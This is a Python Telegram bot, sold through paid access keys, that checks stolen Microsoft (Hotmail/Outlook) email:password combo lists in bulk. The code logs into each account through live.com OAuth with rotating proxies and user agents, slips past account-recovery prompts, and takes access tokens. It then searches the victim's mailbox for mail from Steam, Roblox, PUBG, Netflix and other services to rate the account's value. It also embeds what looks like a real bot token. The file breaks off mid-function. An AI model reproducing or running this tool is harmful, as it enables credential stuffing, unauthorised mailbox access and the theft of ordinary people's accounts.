import sys, os, re, json, time, random, threading, requests, zipfile, io
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timedelta
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from email.utils import parsedate_to_datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8847630217:AAGcuENjLnIzHtUBbvxnKDBoa_DxW2a8yE0"
ADMIN_ID = 7969180514
ADMIN_USERNAME = "@imkansizligim"

ADMIN_THREAD = 10

KEY_FILE = "keys.json"
USER_FILE = "users.json"
ZIP_FILE = "hotmailgamechecker.zip"

user_proxies = {}
proxy_waiting = {}
user_proxy_index = {}

GAME_EMAILS = {
    "supercell": {"email": "noreply@id.supercell.com", "label": "🎮 SUPERCELL"},
    "supercell2": {"email": "no-reply@email.supercell.com", "label": "🎮 SUPERCELL2"},
    "konami": {"email": "konami-info@konami.net", "label": "🕹️ KONAMI"},
    "efootball_coin": {"email": None, "label": "⚽ EFOOTBALL COIN", "content_search": "eFootball™ Coin"},
    "pubg": {"email": "noreply@pubgmobile.com", "label": "🔫 PUBG"},
    "pubg2": {"email": "noreply@mail.pubgmobile.com", "label": "🔫 PUBG2"},
    "pubg3": {"email": None, "label": "🔫 PUBG3", "content_search": "PUBG Mobile Shop"},
    "ea": {"email": "EA@e.ea.com", "label": "⚽ EA"},
    "epic": {"email": "help@acct.epicgames.com", "label": "🎯 EPIC"},
    "steam": {"email": "noreply@steampowered.com", "label": "🎮 STEAM"},
    "riot": {"email": "noreply@mail.accounts.riotgames.com", "label": "⚔️ RIOT"},
    "roblox": {"email": "no-reply@roblox.com", "label": "🎲 ROBLOX"},
    "discord": {"email": "noreply@discord.com", "label": "💬 DISCORD"},
    "mojang": {"email": "noreply@mojang.com", "label": "⛏️ MOJANG"},
    "tiktok": {"email": "register@account.tiktok.com", "label": "🎵 TIKTOK"},
    "netflix": {"email": "info@account.netflix.com", "label": "🎬 NETFLIX"},
    "g2g": {"email": "noreply@g2g.com", "label": "🛒 G2G"},
}

PLANS = {
    "free": {"name": "Free", "daily_limit": 5000, "single_limit": 1500, "duration": None, "thread": 10},
    "daily": {"name": "Daily", "daily_limit": 0, "single_limit": 3000, "duration": 24, "thread": 10},
    "weekly": {"name": "Weekly", "daily_limit": 0, "single_limit": 5000, "duration": 168, "thread": 10},
    "monthly": {"name": "Monthly", "daily_limit": 0, "single_limit": 7000, "duration": 720, "thread": 10},
    "admin": {"name": "Admin", "daily_limit": 0, "single_limit": 0, "duration": None, "thread": None},
}

bakim_modu = False
tarama_durdur = {}
multi_bekleyen = {}
bekleyen_hesaplar = {}

keys_db = {}
users_db = {}

FLAG_MAP = {
    "US": "🇺🇸", "GB": "🇬🇧", "UK": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺", "DE": "🇩🇪",
    "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "BR": "🇧🇷", "IN": "🇮🇳", "JP": "🇯🇵",
    "KR": "🇰🇷", "CN": "🇨🇳", "RU": "🇷🇺", "MX": "🇲🇽", "SA": "🇸🇦", "AE": "🇦🇪",
    "TR": "🇹🇷", "NL": "🇳🇱", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮",
    "PL": "🇵🇱", "CZ": "🇨🇿", "GR": "🇬🇷", "PT": "🇵🇹", "IE": "🇮🇪", "CH": "🇨🇭",
    "AT": "🇦🇹", "BE": "🇧🇪", "LU": "🇱🇺", "IS": "🇮🇸", "NZ": "🇳🇿", "SG": "🇸🇬",
    "MY": "🇲🇾", "ID": "🇮🇩", "TH": "🇹🇭", "VN": "🇻🇳", "PH": "🇵🇭", "AR": "🇦🇷",
    "CL": "🇨🇱", "CO": "🇨🇴", "PE": "🇵🇪", "EG": "🇪🇬", "BS": "🇧🇸", "HK": "🇭🇰",
}


def get_flag(code):
    return FLAG_MAP.get((code or "").upper(), "🏴")


def load_user_proxies(chat_id, content):
    global user_proxies, user_proxy_index
    user_id = str(chat_id)
    user_proxies[user_id] = []
    user_proxy_index[user_id] = 0
    for line in content.strip().split('\n'):
        line = line.strip()
        if line and not line.startswith('#'):
            user_proxies[user_id].append(line)
    return len(user_proxies[user_id])


def get_user_proxy(chat_id):
    global user_proxies, user_proxy_index
    user_id = str(chat_id)
    if user_id in user_proxies and user_proxies[user_id]:
        proxies = user_proxies[user_id]
        idx = user_proxy_index.get(user_id, 0)
        proxy = proxies[idx % len(proxies)]
        user_proxy_index[user_id] = idx + 1
        return proxy
    return None


def format_proxy(p):
    if not p:
        return None
    p = p.strip()
    if "://" in p:
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"


def load_db():
    global keys_db, users_db
    try:
        if os.path.exists(KEY_FILE):
            with open(KEY_FILE, 'r') as f:
                keys_db = json.load(f)
    except:
        keys_db = {}
    try:
        if os.path.exists(USER_FILE):
            with open(USER_FILE, 'r') as f:
                users_db = json.load(f)
    except:
        users_db = {}


def save_db():
    try:
        with open(KEY_FILE, 'w') as f:
            json.dump(keys_db, f, indent=2)
    except:
        pass
    try:
        with open(USER_FILE, 'w') as f:
            json.dump(users_db, f, indent=2)
    except:
        pass


def get_user_plan(chat_id):
    if str(chat_id) == str(ADMIN_ID):
        return "admin"
    user_id = str(chat_id)
    if user_id in users_db:
        user_data = users_db[user_id]
        plan = user_data.get("plan", "free")
        key_expires = user_data.get("key_expires")
        if plan != "free" and key_expires:
            expiry = datetime.fromisoformat(key_expires)
            if datetime.now() > expiry:
                users_db[user_id]["plan"] = "free"
                users_db[user_id]["key_expires"] = None
                users_db[user_id]["daily_used"] = 0
                save_db()
                send_message(chat_id, "⚠️ YOUR PLAN HAS EXPIRED\n\n📋 New Plan: Free")
                return "free"
            return plan
        return plan
    users_db[user_id] = {"plan": "free", "daily_used": 0, "last_reset": datetime.now().strftime('%Y-%m-%d')}
    save_db()
    return "free"


def get_plan_info(plan):
    return PLANS.get(plan, PLANS["free"])


def check_daily_reset(chat_id):
    user_id = str(chat_id)
    if user_id in users_db:
        today = datetime.now().strftime('%Y-%m-%d')
        last_reset = users_db[user_id].get("last_reset", today)
        if last_reset != today:
            users_db[user_id]["daily_used"] = 0
            users_db[user_id]["last_reset"] = today
            save_db()


def get_remaining_daily(chat_id):
    check_daily_reset(chat_id)
    plan = get_user_plan(chat_id)
    plan_info = get_plan_info(plan)
    daily_limit = plan_info["daily_limit"]
    if daily_limit == 0:
        return 999999999
    user_id = str(chat_id)
    daily_used = users_db.get(user_id, {}).get("daily_used", 0)
    return daily_limit - daily_used


def send_message(chat_id, text, reply_markup=None):
    try:
        data = {"chat_id": chat_id, "text": text}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=15)
    except:
        pass


def send_document(chat_id, filepath):
    try:
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": chat_id},
                          files={"document": (os.path.basename(filepath), f)}, timeout=30)
    except:
        pass


def download_file(file_id):
    try:
        file_info = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
                                 params={"file_id": file_id}, timeout=15).json()
        if not file_info.get("ok"):
            return None
        file_path = file_info["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        return requests.get(file_url, timeout=30).text
    except:
        return None


def generate_key(key_type):
    import secrets, string
    chars = string.ascii_uppercase + string.digits
    code = ''.join(secrets.choice(chars) for _ in range(4))
    code2 = ''.join(secrets.choice(chars) for _ in range(4))
    key = f"JULIANBOT-{key_type.upper()}-{code}-{code2}"
    keys_db[key] = {"type": key_type, "expires": None, "bound_to": None, "created": datetime.now().isoformat()}
    save_db()
    return key


def kerpetennecmi(line):
    line = line.strip()
    if not line:
        return None
    for sep in (":", "|", ";", ","):
        if sep in line:
            parts = line.split(sep, 1)
            email, pwd = parts[0].strip(), parts[1].strip()
            if email and pwd and "@" in email:
                return f"{email}:{pwd}"
    return None


def cokludosyayukle(dosya_listesi):
    tum_hesaplar = []
    for dosya in dosya_listesi:
        dosya = dosya.strip()
        if not dosya or not os.path.exists(dosya):
            continue
        try:
            with open(dosya, 'r', encoding='utf-8', errors='ignore') as f:
                satirlar = [l.strip() for l in f if ':' in l.strip() and not l.strip().startswith('#')]
            for satir in satirlar:
                norm = kerpetennecmi(satir)
                if norm:
                    tum_hesaplar.append(norm)
        except:
            pass
    return list(dict.fromkeys(tum_hesaplar))


batmanparkyetkilisi = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]


def ataturkparki():
    return random.choice(batmanparkyetkilisi)


# ============================================================
# ROBLOX
# ============================================================

def roblox_gidd(username):
    try:
        r = requests.post("https://users.roblox.com/v1/usernames/users",
                          json={"usernames": [username], "excludeBannedUsers": False}, timeout=10)
        if r.status_code == 200 and r.json().get("data"):
            return r.json()["data"][0]["id"]
    except:
        pass
    return None


def roblox_csrf():
    s = requests.Session()
    try:
        r = s.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": []}, timeout=10)
        return r.headers.get("x-csrf-token"), s
    except:
        return None, None


def roblox_gsnn(asset_ids):
    if not asset_ids:
        return []
    token, session = roblox_csrf()
    if not token or not session:
        return []
    items = [{"itemType": "Asset", "id": int(aid)} for aid in asset_ids]
    try:
        r = session.post("https://catalog.roblox.com/v1/catalog/items/details",
                         json={"items": items}, headers={"x-csrf-token": token}, timeout=10)
        if r.status_code != 200:
            return []
        return [item.get("name", "Unknown Item") for item in r.json().get("data", [])]
    except:
        return []


def roblox_eruu(text):
    for pattern in [r'account:\s*([a-zA-Z0-9_]+)', r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',
                    r'account:\s*([a-zA-Z0-9_]+)\.', r'for\s+([a-zA-Z0-9_]+)\.\s+If']:
        m = re.search(pattern, text, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def roblox_rlll(username, proxies=None):
    result = {"username": username, "friends": 0, "banned": "No", "created": "Unknown",
              "profile": "", "wearing": []}
    uid = roblox_gidd(username)
    if not uid:
        return result
    try:
        u = requests.get(f"https://users.roblox.com/v1/users/{uid}", timeout=10, proxies=proxies).json()
        result["banned"] = "Yes" if u.get("isBanned", False) else "No"
        created = u.get("created", "")
        result["created"] = created.split("T")[0] if created else "Unknown"
        f = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", timeout=10, proxies=proxies).json()
        result["friends"] = f.get("count", 0)
        result["profile"] = f"https://www.roblox.com/users/{uid}/profile"
        w = requests.get(f"https://avatar.roblox.com/v1/users/{uid}/currently-wearing", timeout=10, proxies=proxies)
        if w.status_code == 200:
            result["wearing"] = roblox_gsnn(w.json().get("assetIds", []))
    except:
        pass
    return result


# ============================================================
# MICROSOFT CHECKER
# ============================================================

class marazali:
    REQ = 25

    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.s = self.toyotacorollabest()
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.cid = ""
        self.country = ""
        self.name = ""
        self.gelsinhayatbildigigibi = None
        self.sahteparantezleracmasakin = (
            "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )

    def toyotacorollabest(self):
        s = requests.Session()
        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        return s

    def nihathatipoglu(self, tag):
        try:
            h = {"User-Agent": ataturkparki(),
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False)
            text = r.text
            m = (re.search(r'value=\\"(.+?)\\"', text, re.S)
                 or re.search(r'value="(.+?)"', text, re.S)
                 or re.search(r"sFTTag:'(.+?)'", text, re.S)
                 or re.search(r'sFTTag:"(.+?)"', text, re.S)
                 or re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
            if not m:
                return "BAD"
            sFTTag = m.group(1)
            m2 = (re.search(r'"urlPost":"(.+?)"', text, re.S)
                  or re.search(r"urlPost:'(.+?)'", text, re.S)
                  or re.search(r'urlPost:"(.+?)"', text, re.S)
                  or re.search(r'<form.*?action="(.+?)"', text, re.S))
            if not m2:
                return "BAD"
            urlPost = m2.group(1).replace("&amp;", "&")
            data = {"login": self.email, "loginfmt": self.email, "passwd": self.password, "PPFT": sFTTag}
            h2 = {"Content-Type": "application/x-www-form-urlencoded",
                  "User-Agent": ataturkparki(),
                  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                  "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
            r2 = self.s.post(urlPost, data=data, headers=h2, allow_redirects=True, timeout=self.REQ, verify=False)
            if "#" in r2.url and r2.url != self.sahteparantezleracmasakin:
                token = parse_qs(urlparse(r2.url).fragment).get("access_token", ["None"])[0]
                if token != "None":
                    self.gelsinhayatbildigigibi = token
                    return "SUCCESS"
            if "cancel?mkt=" in r2.text:
                try:
                    ipt = re.search(r'(?<="ipt" value=").+?(?=">)', r2.text)
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', r2.text)
                    uaid = re.search(r'(?<="uaid" value=").+?(?=">)', r2.text)
                    if ipt and pprid and uaid:
                        d = {"ipt": ipt.group(), "pprid": pprid.group(), "uaid": uaid.group()}
                        act = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r2.text)
                        if act:
                            ret = self.s.post(act.group(), data=d, allow_redirects=True, timeout=self.REQ, verify=False)
                            ru = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if ru:
                                fin = self.s.get(ru.group(), allow_redirects=True, timeout=self.REQ, verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get("access_token", ["None"])[0]
                                if token != "None":
                                    self.gelsinhayatbildigigibi = token
                                    return "SUCCESS"
                except:
                    pass
            if any(v in r2.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt",
                                          "Email/Confirm?mkt", "/Abuse?mkt=", ",AC:null,urlFedConvertRename"]):
                return "2FA"
            ft = r2.text.lower()
            if any(v in ft for v in ["password is incorrect", "account doesn't exist",
                                     "that microsoft account doesn't exist", "sign in to your microsoft account",
                                     "tried to sign in too many times", "help us protect your account",
                                     "your account or password is incorrect"]):
                return "BAD"
            return "BAD"
        except:
            return "ERROR"

    def kimseyisevemem(self, tag):
        try:
            self.sahteparantezleracmasakin = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=00000000402B5328"
                "&response_type=token"
                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            h = {"User-Agent": ataturkparki()}
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    self.gelsinhayatbildigigibi = tok
                    return tok
            self.soyleyememyeminederim = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=0000000048170EF2"
                "&response_type=token"
                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            r = self.s.get(self.soyleyememyeminederim, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    return tok
            return None
        except:
            return None

    def ahhhelerimtitriyor(self, tag):
        try:
            cid = self.s.cookies.get("MSPCID", "")
            if cid:
                self.cid = cid.upper()
                return True
            m = re.search(r'MSPCID=([^;\s]+)', str(self.s.cookies))
            if m:
                self.cid = m.group(1).upper()
                return True
            self.cid = self.email.upper().replace("@", "").replace(".", "")
            return True
        except:
            return False

    def profil_cek(self, token):
        try:
            h = {"User-Agent": "Outlook-Android/2.0",
                 "Authorization": f"Bearer {token}",
                 "X-AnchorMailbox": f"CID:{self.cid}",
                 "Connection": "Keep-Alive",
                 "Accept-Encoding": "gzip",
                 "Accept": "application/json"}
            r = self.s.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                           headers=h, timeout=self.REQ, verify=False)
            if r.status_code == 200:
                d = r.json()
                if "accounts" in d and len(d["accounts"]) > 0:
                    acc = d["accounts"][0]
                    self.country = acc.get("location", "") or "Unknown"
                if "names" in d and len(d["names"]) > 0:
                    self.name = d["names"][0].get("displayName", "") or ""
                return True
            return False
        except:
            return False

    def _tarih(self, result):
        date_str = result.get("DateTimeReceived") or result.get("DateTimeLastModified")
        if date_str:
            try:
                return parsedate_to_datetime(date_str).strftime('%Y-%m-%d %H:%M:%S')
            except:
                pass
        preview = result.get("Preview", "") or result.get("BodyPreview", "")
        m = re.search(r'(\d{1,2}[/\.-]\d{1,2}[/\.-]\d{2,4})', preview)
        if m:
            return m.group(1)
        return "N/A"

    def search_messages(self, tag, game_key, token):
        try:
            game_data = GAME_EMAILS[game_key]
            query = game_data["content_search"] if "content_search" in game_data else f'from:"{game_data["email"]}"'
            url = "https://outlook.live.com/search/api/v2/query"
            params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
            body = {
                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "RefiningQueries": None,
                    "Size": 500,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                    "EnableTopResults": True,
                    "TopResultsCount": 5
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification",
                                                      "NoResultFolderRefinerModification",
                                                      "NoRequeryModification", "Modification"]
                },
                "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
            }
            h = {"User-Agent": "Outlook-Android/2.0",
                 "Authorization": f"Bearer {token}",
                 "X-AnchorMailbox": f"CID:{self.cid}",
                 "Connection": "Keep-Alive",
                 "Accept-Encoding": "gzip",
                 "Content-Type": "application/json"}
            r = self.s.post(url, params=params, headers=h, json=body, timeout=self.REQ, verify=False)
            if r.status_code == 200:
                data = r.json()
                total = 0
                tarih = "N/A"
                subject = ""
                preview = ""
                for es in data.get("EntitySets", []):
                    if es.get("Total") is not None:
                        total = es.get("Total", 0)
                        break
                for es in data.get("EntitySets", []):
                    results = es.get("Results", [])
                    if results:
                        first = results[0]
                        tarih = self._tarih(first)
                        subject = (first.get("Subject", "") or first.get("ConversationTopic", ""))[:80]
                        preview = (first.get("Preview", "") or first.get("BodyPreview", ""))[:80]
                        break
                if total == 0:
                    m = re.search(r'"Total":\s*(\d+)', r.text)
                    if m:
                        total = int(m.group(1))
                return total, tarih, subject, preview
            return 0, "N/A", "", ""
        except:
            return 0, "N/A", "", ""

    def check(self, tag):
        status = self.nihathatipoglu(tag)
        if status != "SUCCESS":
            return status, None
        self.ahhhelerimtitriyor(tag)
        token = self.kimseyisevemem(tag)
        if not token:
            return "BAD", None
        self.profil_cek(token)
        time.sleep(0.3)
        mesaj_info = {}
        for game_key in GAME_EMAILS:
            sayi, tarih, subj, prev = self.search_messages(tag, game_key, token)
            mesaj_info[game_key] = {"sayi": sayi, "tarih": tarih, "subject": subj, "preview": prev}
            time.sleep(0.2)
        return "SUCCESS", mesaj_info


# ============================================================
# MENÜLER
# ============================================================

def ana_menu(chat_id):
    if str(chat_id) == str(ADMIN_ID):
        plan = "Admin"
        kalan = "Unlimited"
        thread = ADMIN_THREAD
    else:
        plan_name = get_user_plan(chat_id)
        plan_info = get_plan_info(plan_name)
        plan = plan_info["name"]
        user_id = str(chat_id)
        user_data = users_db.get(user_id, {})
        key_expires = user_data.get("key_expires")
        if key_expires and plan != "Free":
            expiry = datetime.fromisoformat(key_expires)
            remaining = expiry - datetime.now()
            kalan = f"{remaining.days}d {(remaining.seconds // 3600)}h {((remaining.seconds % 3600) // 60)}m"
        else:
            kalan = "Unlimited"
        thread = plan_info["thread"]

    keyboard = {
        "inline_keyboard": [
            [{"text": "🚀 Check", "callback_data": "baslat"},
             {"text": "📂 Multi Scan", "callback_data": "multi_start"}],
            [{"text": "📊 Status", "callback_data": "durum"},
             {"text": "🔑 Enter Key", "callback_data": "key_giris"}],
            [{"text": "💰 Prices", "callback_data": "fiyatlar"},
             {"text": "📡 Proxy", "callback_data": "proxy"}],
        ]
    }
    if str(chat_id) == str(ADMIN_ID):
        keyboard["inline_keyboard"].insert(0, [{"text": "⚡ Thread Settings", "callback_data": "thread_menu"}])
        keyboard["inline_keyboard"].insert(3, [{"text": "🔑 Create Key", "callback_data": "key_olustur"}])

    text = (
        f"╔══════════════════════════════════════════════╗\n"
        f"║     HOTMAIL GAME CHECKER - JULIAN BOT       ║\n"
    )
    if str(chat_id) == str(ADMIN_ID):
        text += f"║     👑 ADMIN PANEL 👑                       ║\n"
    text += f"╚══════════════════════════════════════════════╝\n\n"
    text += f"📋 Plan: {plan}\n⏳ Remaining: {kalan}\n⚡ Thread: {thread}\n"
    send_message(chat_id, text, keyboard)


def proxy_menu(chat_id):
    user_id = str(chat_id)
    count = len(user_proxies.get(user_id, []))
    keyboard = {
        "inline_keyboard": [
            [{"text": "📥 Proxy Ekle", "callback_data": "proxy_ekle"},
             {"text": "🗑️ Proxy Sil", "callback_data": "proxy_sil"}],
            [{"text": "🔙 Geri", "callback_data": "main_menu"}],
        ]
    }
    send_message(chat_id, f"📡 PROXY MENU\n\nLoaded: {count} proxies", keyboard)


def fiyat_menu(chat_id):
    send_message(chat_id,
                 f"💰 PRICE LIST\n\n📋 PLANS:\n────────────────────────────\n"
                 f"Daily: 750 TCoin\nWeekly: 3.000 TCoin\nMonthly: 9.000 TCoin\n\n💡 {ADMIN_USERNAME}")


def durum_menu(chat_id):
    if str(chat_id) == str(ADMIN_ID):
        aktif_keyler = len([k for k, v in keys_db.items() if not v.get("expires") or datetime.fromisoformat(v["expires"]) > datetime.now()])
        satilan_keyler = len([k for k, v in keys_db.items() if v.get("bound_to")])
        toplam_kullanici = len(users_db)
        premium = len([u for u in users_db.values() if u.get("plan") != "free"])
        send_message(chat_id,
                     f"👑 ADMIN STATUS\n\n⚡ Thread: {ADMIN_THREAD}\n\n"
                     f"━━━━━━━━━━━━━━━━━━\nActive Keys: {aktif_keyler}\n"
                     f"Sold Keys: {satilan_keyler}\nTotal Users: {toplam_kullanici}\n"
                     f"Premium: {premium}\nFree: {toplam_kullanici - premium}")
    else:
        plan_name = get_user_plan(chat_id)
        plan_info = get_plan_info(plan_name)
        user_id = str(chat_id)
        user_data = users_db.get(user_id, {})
        key_expires = user_data.get("key_expires")
        if key_expires and plan_name != "free":
            expiry = datetime.fromisoformat(key_expires)
            remaining = expiry - datetime.now()
            kalan = f"{remaining.days}d {(remaining.seconds // 3600)}h"
        else:
            kalan = "Unlimited"
        daily_limit = plan_info["daily_limit"]
        single_limit = plan_info["single_limit"]
        daily_used = user_data.get("daily_used", 0)
        kalan_hak = daily_limit - daily_used if daily_limit > 0 else "Unlimited"
        proxy_count = len(user_proxies.get(str(chat_id), []))
        send_message(chat_id,
                     f"📊 STATUS PANEL\n\n📋 Plan: {plan_info['name']}\n⏳ Remaining: {kalan}\n"
                     f"📊 Today: {daily_used}/{daily_limit if daily_limit > 0 else '∞'}\n"
                     f"📂 Single Scan: {single_limit if single_limit > 0 else '∞'}\n"
                     f"⚡ Thread: {plan_info['thread']}\n📡 Proxies: {proxy_count}")


def key_menu(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📅 Daily Key (750 TCoin)", "callback_data": "key_daily"}],
            [{"text": "📆 Weekly Key (3.000 TCoin)", "callback_data": "key_weekly"}],
            [{"text": "🗓️ Monthly Key (9.000 TCoin)", "callback_data": "key_monthly"}],
            [{"text": "🔙 Geri", "callback_data": "main_menu"}],
        ]
    }
    send_message(chat_id, "🔑 CREATE KEY", keyboard)


def keyler_listesi(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    aktif_keyler = []
    for key, data in keys_db.items():
        if data.get("expires"):
            expiry = datetime.fromisoformat(data["expires"])
            if expiry <= datetime.now():
                continue
        kalan = "Not Started"
        bitis = "Not started"
        if data.get("expires"):
            expiry = datetime.fromisoformat(data["expires"])
            rem = expiry - datetime.now()
            kalan = f"{rem.days}d {(rem.seconds // 3600)}h"
            bitis = expiry.strftime('%Y-%m-%d %H:%M')
        bound = data.get("bound_to")
        sahip = f"👤 {bound}" if bound else "👤 Not Sold"
        type_label = PLANS[data["type"]]["name"]
        aktif_keyler.append(f"{key}\n📋 {type_label} | ⏳ {kalan} | 📅 {bitis} | {sahip}")
    if aktif_keyler:
        send_message(chat_id, "📋 ACTIVE KEYS\n\n" + "\n\n".join(aktif_keyler) + f"\n\n━━━━━━━━━━━━━━━━━━\nTotal: {len(aktif_keyler)}")
    else:
        send_message(chat_id, "📋 ACTIVE KEYS\n\nNo keys yet.")


def thread_menu(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "1", "callback_data": "thread_1"}, {"text": "2", "callback_data": "thread_2"}, {"text": "3", "callback_data": "thread_3"}],
            [{"text": "4", "callback_data": "thread_4"}, {"text": "5", "callback_data": "thread_5"}, {"text": "10", "callback_data": "thread_10"}],
            [{"text": "15", "callback_data": "thread_15"}, {"text": "20", "callback_data": "thread_20"}, {"text": "25", "callback_data": "thread_25"}],
            [{"text": "🔙 Geri", "callback_data": "main_menu"}],
        ]
    }
    send_message(chat_id, f"⚡ THREAD SETTINGS\n\nCurrent: {ADMIN_THREAD}", keyboard)


def rapor(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    aktif_keyler = len([k for k, v in keys_db.items() if not v.get("expires") or datetime.fromisoformat(v["expires"]) > datetime.now()])
    satilan_keyler = len([k for k, v in keys_db.items() if v.get("bound_to")])
    toplam_kullanici = len(users_db)
    premium = len([u for u in users_db.values() if u.get("plan") != "free"])
    send_message(chat_id, f"📊 REPORT\n\nKeys Sold: {satilan_keyler}\nActive: {aktif_keyler}\nUsers: {toplam_kullanici}\nPremium: {premium}\nFree: {toplam_kullanici - premium}")


def duyuru(chat_id, mesaj):
    if str(chat_id) != str(ADMIN_ID):
        return
    gonderilen = 0
    for user_id in users_db:
        try:
            send_message(int(user_id), f"📢 ANNOUNCEMENT\n\n{mesaj}")
            gonderilen += 1
        except:
            pass
    send_message(chat_id, f"✅ Sent to {gonderilen} users.")


def bakim(chat_id):
    global bakim_modu
    if str(chat_id) != str(ADMIN_ID):
        return
    bakim_modu = not bakim_modu
    send_message(chat_id, f"🔧 Maintenance: {'ON' if bakim_modu else 'OFF'}")


# ============================================================
# TARAMA — STATE TABANLI
# ============================================================

def tarama_yap(chat_id, accounts, dosya_adi):
    global ADMIN_THREAD

    plan_name = get_user_plan(chat_id)
    plan_info = get_plan_info(plan_name)
    thread_sayisi = ADMIN_THREAD if str(chat_id) == str(ADMIN_ID) else plan_info["thread"]

    dogrudogru = len(accounts)
    baslangic = time.time()
    tarama_durdur[chat_id] = False

    state = {
        "checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0,
        "keyword_sayaci": {},
        "ulke_sayaci": {},
        "ulke_icerik": {},
        "keyword_icerik": {},
        "twofa_icerik": [],
        "all_hits_icerik": [],
    }

    lock = threading.Lock()
    semaphore = threading.BoundedSemaphore(thread_sayisi)

    sent = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         data={"chat_id": chat_id, "text": "⚡️ Tarama Başlıyor..."}, timeout=15).json()
    progress_message_id = sent["result"]["message_id"] if sent.get("ok") else None

    def check_one(combo):
        try:
            if tarama_durdur.get(chat_id, False):
                return
            email, password = combo.split(":", 1)
            tag = email.split("@")[0][:12]
            proxy_str = get_user_proxy(chat_id)
            formatted_proxy = format_proxy(proxy_str) if proxy_str else None
            c = marazali(email, password, formatted_proxy)
            status, mesaj_info = c.check(tag)

            with lock:
                if status == "SUCCESS":
